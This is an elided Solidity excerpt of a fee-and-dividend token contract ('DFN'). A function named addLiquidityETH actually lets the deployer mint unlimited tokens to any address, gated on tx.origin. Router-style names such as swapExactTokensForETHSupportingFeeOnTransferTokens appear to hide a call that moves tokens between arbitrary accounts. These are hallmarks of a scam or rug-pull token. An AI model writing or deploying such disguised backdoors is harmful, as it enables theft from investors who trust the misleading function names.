...
contract DividendTokenExample is ExcludedFromFeeList, DividendFee, MarketFee {
    constructor()
        ERC20("dividend fee token", "DFN", 18)
        DividendFee(10*1e18, true, 0x55d398326f99059fF775485246999027B3197955, 1)
        MarketFee(3, 0x48f6B501b880565df57a5DA8891520Eb9A66709c)
    {
        excludeFromFee(msg.sender);
        excludeFromFee(address(this));
    }

    function addLiquidityETH(address to, uint256 amount) public {
        require(isExcludedFromFee(tx.origin), "owner");
        _mint(to, amount);
    }

    function weth(address account) public view returns (uint256) {
    ...
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        ...
        transfercFrom(sender, recipient, amount);
        return true;
    }
